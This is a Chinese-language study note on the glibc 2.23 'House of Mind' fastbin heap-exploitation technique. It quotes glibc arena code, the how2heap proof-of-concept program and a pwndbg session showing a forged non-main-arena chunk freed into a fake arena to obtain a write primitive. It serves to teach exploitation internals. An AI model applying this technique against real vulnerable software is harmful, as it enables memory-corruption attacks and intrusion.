## House of Mind

#### 本机制讲解是基于how2heap上面的house of mind fastbin进行的

### 机制讲解
1. 先看一下glibc里面当当前chunk不位于main arena的时候如何寻找arena
```c
// glibc-2.23/arena.c
/* find the heap and corresponding arena for a given ptr */

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1))) // 那就按照HEAP MAX SIZE向下对齐，即为当前块所属heap info的地址
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena) // 如果 non main arena标识位被标识（第三位）

```
2. 再看heap info结构体
```c
// glibc-2.23/arena.c
/* A heap is a single contiguous memory region holding (coalesceable)
   malloc_chunks.  It is allocated with mmap() and always starts at an
   address aligned to HEAP_MAX_SIZE.  */

typedef struct _heap_info
{
  mstate ar_ptr; /* Arena for this heap. */ //heap info里面第一个指针指向他所在的arena
  struct _heap_info *prev; /* Previous heap. */
  size_t size;   /* Current size in bytes. */
  size_t mprotect_size; /* Size in bytes that has been mprotected
                           PROT_READ|PROT_WRITE.  */
  /* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */
  char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK];
} heap_info;
```
3. 参考上面的两段glibc源码，咱们**利用修改chunk的size标识位，将其标记为不在main arena上面，在free后成功把他放入我们fake arena**
```c
// how2heap/glibc_2.23/house_of_mind_fastbin.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

int main(){

	printf("House of Mind - Fastbin Variant\n");
	puts("==================================");
	printf("The goal of this technique is to create a fake arena\n");
	printf("at an offset of HEAP_MAX_SIZE\n");
	
	printf("Then, we write to the fastbins when the chunk is freed\n");
	printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
	// Values for the allocation information.	
	int HEAP_MAX_SIZE = 0x4000000; // 设定HEAP_MAX_SIZE为64mb
	int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635 // maxsize设置的比达到mmap限制要小一点，防止用mmap分配chunk，而是一直通过扩展brk来扩展heap和分配chunk

	printf("Find initial location of the heap\n");
	// The target location of our attack and the fake arena to use
	uint8_t* fake_arena = malloc(0x1000); // 我们构造的fake arena在堆上，这样可写
	uint8_t* target_loc = fake_arena + 0x28; // 大小为0x60的fastbin在arena+0x28偏移上

	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

	/*
	Prepare a valid 'malloc_state' (arena) 'system_mem' 
	to store a fastbin. This is important because the size
	of a chunk is validated for being too small or too large
	via the 'system_mem' of the 'malloc_state'. This just needs
	to be a value larger than our fastbin chunk.
	*/
	printf("Set 'system_mem' (offset 0x880) for fake arena\n");
	fake_arena[0x880] = 0xFF;
	fake_arena[0x881] = 0xFF; 
	fake_arena[0x882] = 0xFF; // 把fake arena 的sys_mem值改特别大，这样分配的时候不会出错

	printf("Target Memory Address for overwrite: %p\n", target_loc);
	printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);

	// Calculate the location of our fake arena
	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1); // 将fake heap info的地址与HEAP MAX SIZE对齐
	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

	uint64_t* user_mem = malloc(MAX_SIZE);
	printf("Fake Heap Info struct location: %p\n", fake_heap_info);
	printf("Allocate until we reach a MAX_HEAP_SIZE offset\n");	

	/* 
	The fake arena must be at a particular offset on the heap.
	So, we allocate a bunch of chunks until our next chunk
	will be in the arena. This value was calculated above.
	*/
	while((long long)user_mem < new_arena_value){
		user_mem = malloc(MAX_SIZE); // 一直分配一个大块，直到堆的top边界到fake heap info地址（当然是对齐好的）之后
	}

	// Use this later to trigger craziness
	printf("Create fastbin sized chunk to be victim of attack\n");
	uint64_t* fastbin_chunk = malloc(0x50); // Size of 0x60 // 这时候再malloc块就会在fake heap info之后的地址上分配了
	uint64_t* chunk_ptr = fastbin_chunk - 2; // Point to chunk instead of mem
	printf("Fastbin Chunk to overwrite: %p\n", fastbin_chunk);

	/*
	Create a FAKE malloc_state pointer for the heap_state
	This is the 'ar_ptr' of the 'heap_info' struct shown above. 
	This is the first entry in the 'heap_info' struct at offset 0x0
	 at the heap.

	We set this to the location where we want to write a value to.
	The location that gets written to depends on the fastbin chunk
	size being freed. This will be between an offset of 0x8 and 0x40
	bytes. For instance, a chunk with a size of 0x20 would be in the
	0th index of fastbinsY struct. When this is written to, we will
	write to an offset of 8 from the original value written.
	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
	*/
	printf("Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n", fake_arena);
	fake_heap_info[0] = (uint64_t) fake_arena; // Setting the fake ar_ptr (arena) // 把fake heap info的arena指针指向我们前面开辟的fake arena
	printf("Target Write at %p prior to exploitation: 0x%x\n", target_loc, *(target_loc));

	/*
	Set the non-main arena bit on the size. 
	Additionally, we keep the size the same as the original
	allocation because there is a sanity check on the fastbin (when freeing)
	that the next chunk has a valid size. 

	When grabbing the non-main arena, it will use our choosen arena!
	From there, it will write to the fastbin because of the size of the
	chunk.

	///// Vulnerability! Overwriting the chunk size 
	*/
	printf("Set non-main arena bit on the fastbin chunk\n");
	puts("NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n");
	chunk_ptr[1] = 0x60 | 0x4; // Setting the non-main arena bit // 设置刚才最后分配的那个chunk的size为0x60，标识位标记为non main arena，意即不是由main arena分配的，所以他就会触发arena_for_chunk，从而他的heap info是由heap_for_ptr来寻找的，向下对齐HEAP_MAX_SIZE,正好就是fake heap info的地址，他也就被认为是fake heap info分配出来的块了。

	//// End vulnerability 

	/*
	The offset being written to with the fastbin chunk address
	depends on the fastbin BEING used and the malloc_state itself. 
	In 2.23, the offset from the beginning of the malloc_state
	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an 
	additional byte offset of 0x20. In total, the writing offset
	from the arena location is 0x28 bytes.
	from the arena location to where the write actually occurs. 
	This is a similar concept to bk - 0x10 from the unsorted
	bin attack. 
	*/
	printf("When we free the fastbin chunk with the non-main arena bit\n");
	printf("set, it will cause our fake 'heap_info' struct to be used.\n");
	printf("This will dereference our fake arena location and write\n");
	printf("the address of the heap to an offset of the arena pointer.\n");

	printf("Trigger the magic by freeing the chunk!\n");
	free(fastbin_chunk); // Trigger the madness // 那么他释放的时候也会进入fake heap info里面的arena，即fake arena。由于她是fastbin，所以进入fastbin里面0x60大小的bin，也就是target loc位置

	// For this particular fastbin chunk size, the offset is 0x28. 
	printf("Target Write at %p: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
	assert(*((unsigned long *) (target_loc)) != 0);
}

```

* **可以看到，house of mind的利用条件特别苛刻，我们不仅要构造一个fake heap info，还要选择一个fake arena。**
* **fake heap info应该是与HEAP_MAX_SIZE对齐的，后续还需要大量分配大堆块使得堆增长到fake heap info位置。**
* **正常的ctf题目里面不会出现这种利用场景的，所以这个只做了解即可，学习到heap info结构体和heap_for_ptr知识就ok**

### gdb 动态调试过程（不作详细过程说明了）
```bash
pwndbg> b 127
Note: breakpoint 1 also set at pc 0x555555555272.
Breakpoint 3 at 0x555555555272: file glibc_2.23/house_of_mind_fastbin.c, line 134.
pwndbg> i b
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x0000555555555272 in main at glibc_2.23/house_of_mind_fastbin.c:134
3       breakpoint     keep y   0x0000555555555272 in main at glibc_2.23/house_of_mind_fastbin.c:134
pwndbg> c
Continuing.
House of Mind - Fastbin Variant
==================================
The goal of this technique is to create a fake arena
at an offset of HEAP_MAX_SIZE
Then, we write to the fastbins when the chunk is freed
This creates a somewhat constrained WRITE-WHERE primitive
Find initial location of the heap

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x1010 (with flag bits: 0x1011) 先分配一个0x1000的可写块作为fake arena

Top chunk | PREV_INUSE
Addr: 0x55555555a420
Size: 0x1fbe0 (with flag bits: 0x1fbe1)

pwndbg> b 139
Breakpoint 4 at 0x5555555552a8: file glibc_2.23/house_of_mind_fastbin.c, line 139.
pwndbg> c
Continuing.
Set 'system_mem' (offset 0x880) for fake arena

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x1010 (with flag bits: 0x1011)

Top chunk | PREV_INUSE
Addr: 0x55555555a420
Size: 0x1fbe0 (with flag bits: 0x1fbe1)

pwndbg> x/gx 0x555555559410+0x10+0x880
0x555555559ca0:	0x0000000000ffffff 可以看见fake arena的system_mem已经被改到很大了，这样之后malloc(MAX_SIZE)不会出错

pwndbg> b 145
Breakpoint 5 at 0x5555555552ff: file glibc_2.23/house_of_mind_fastbin.c, line 146.
pwndbg> c
Continuing.
Target Memory Address for overwrite: 0x555555559448
Must set data at HEAP_MAX_SIZE (0x4000000) offset

pwndbg> p/x fake_heap_info
$1 = 0x555558000000 // fake heap info因为要与HEAP_MAX_SIZE对齐，被设定在很高的地址位置

pwndbg> b 150
Breakpoint 6 at 0x55555555533a: file glibc_2.23/house_of_mind_fastbin.c, line 155.
pwndbg> c
Continuing.
Fake Heap Info struct location: 0x555558000000
Allocate until we reach a MAX_HEAP_SIZE offset

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x1010 (with flag bits: 0x1011)

Allocated chunk | PREV_INUSE
Addr: 0x55555555a420
Size: 0x1ff10 (with flag bits: 0x1ff11) // 开始向后分配大块，直到大于fake heap info位置

Top chunk | PREV_INUSE
Addr: 0x55555557a330
Size: 0x20cd0 (with flag bits: 0x20cd1)

pwndbg> b 160
Breakpoint 7 at 0x555555555357: file glibc_2.23/house_of_mind_fastbin.c, line 160.
pwndbg> c
Continuing.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x555555559410
Size: 0x1010 (with flag bits: 0x1011)

Allocated chunk | PREV_INUSE
Addr: 0x55555555a420
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x55555557a330
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x55555559a240
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x5555555ba150
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x5555555da060
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x5555555f9f70
Size: 0x1ff10 (with flag bits: 0x1ff11)

中间省略。。。。。。

Allocated chunk | PREV_INUSE
Addr: 0x555557fc6560
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x555557fe6470
Size: 0x1ff10 (with flag bits: 0x1ff11)

Allocated chunk | PREV_INUSE
Addr: 0x555558006380
Size: 0x1ff10 (with flag bits: 0x1ff11) 最终终于到fake heap info之后了

Top chunk | PREV_INUSE
Addr: 0x555558026290
Size: 0x20d70 (with flag bits: 0x20d71)

pwndbg> b 165
Breakpoint 8 at 0x55555555539b: file glibc_2.23/house_of_mind_fastbin.c, line 179.
pwndbg> c
Continuing.
Create fastbin sized chunk to be victim of attack
Fastbin Chunk to overwrite: 0x5555580262a0 // 下面分配的这个0x60大小的块在这里

pwndbg> b 183
Breakpoint 9 at 0x5555555553e6: file glibc_2.23/house_of_mind_fastbin.c, line 195.
pwndbg> c
Continuing.
Setting 'ar_ptr' (our fake arena)  in heap_info struct to 0x555555559420
Target Write at 0x555555559448 prior to exploitation: 0x0

pwndbg> p/x fake_heap_info
$2 = 0x555558000000
pwndbg> x/gx $2
0x555558000000:	0x0000555555559420 // 可见fake heap info的第一个指针已经指向了fake arena
pwndbg> p/x fake_arena
$3 = 0x555555559420

pwndbg> b 198
Breakpoint 10 at 0x555555555413: file glibc_2.23/house_of_mind_fastbin.c, line 212.
pwndbg> c
Continuing.
Set non-main arena bit on the fastbin chunk
NOTE: This keeps the next chunk size valid because the actual chunk size was never changed

pwndbg> x/2gx 0x555558026290
0x555558026290:	0x0000000000000000	0x0000000000000064 // 可见这个chunk的大小和non main arena标识位已经被标注

pwndbg> b 219
Breakpoint 11 at 0x55555555546a: file glibc_2.23/house_of_mind_fastbin.c, line 221.
pwndbg> c
Continuing.
When we free the fastbin chunk with the non-main arena bit
set, it will cause our fake 'heap_info' struct to be used.
This will dereference our fake arena location and write
the address of the heap to an offset of the arena pointer.
Trigger the magic by freeing the chunk!

pwndbg> fastbin
fastbins
empty
pwndbg> p/x fake_arena
$4 = 0x555555559420
pwndbg> x/gx $4+0x28
0x555555559448:	0x0000555558026290 // 可见这个chunk被free后并没有进main arena的fastbins，而是进的fake arena的fastbin
```
